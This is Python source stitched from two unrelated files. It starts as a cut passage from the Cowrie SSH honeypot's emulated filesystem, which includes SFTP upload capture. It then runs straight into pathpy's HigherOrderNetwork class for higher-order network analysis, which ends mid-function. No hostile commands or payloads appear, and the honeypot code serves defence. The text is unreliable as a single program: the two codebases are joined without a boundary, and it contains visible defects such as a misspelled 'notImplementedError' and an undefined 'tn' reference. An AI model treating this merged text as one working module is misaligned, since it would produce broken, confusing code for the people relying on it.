                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """
        """
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system object for a path
        """
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))                    
        return p


    def file_contents(self, target):
        """
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """
    Below additions for SFTP support, try to keep functions here similar to os.*
    """
    def open(self, filename, openFlags, mode):
        """
        #log.msg("fs.open %s" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg("fs.open append")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg("fs.open creat")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg("fs.open trunc")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg("fs.open excl")

        # treat O_RDWR same as O_WRONLY
        """
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg("fs.open file for writing, saving to %s" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """
        """
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """
        """
        return os.write(fd, string)


    def close(self, fd):
        """
        """
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + "/" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \"%(filename)s\" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """
        """
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """
        FIXME mkdir() name conflicts with existing mkdir
        """
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """
        """
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """
        """
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """
        """
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """
        """
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """
        """
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """
        """
        if (path == "/"):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """
        """
        return path


    def update_size(self, filename, size):
        """
        """
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """
    Transform a tuple into a stat object
    """
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime


# -*- coding: utf-8 -*-
"""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zrich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
"""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """
    pass


class HigherOrderNetwork:
    """
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """ Returns the number of nodes """
        return len(self.nodes)


    def ecount(self):
        """ Returns the number of links """
        return len(self.edges)


    def totalEdgeWeight(self):
        """ Returns the sum of all edge weights """
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption="paths"):
        """
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:                    
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:                    
            for v in self.nodes:                    
                for w in self.nodes:                    
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for v in self.nodes:                    
            for w in self.nodes:                    
                if v != w:                    
                    for k in self.nodes:                    
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:                    
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:                    
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """
        Returns the default string representation of
        this graphical model instance
        """
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """

        if _sparse.issparse(A) == False:
            raise TypeError("A must be a sparse matrix")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which="LM", ncv=lanczosVecs, maxiter=maxiter)
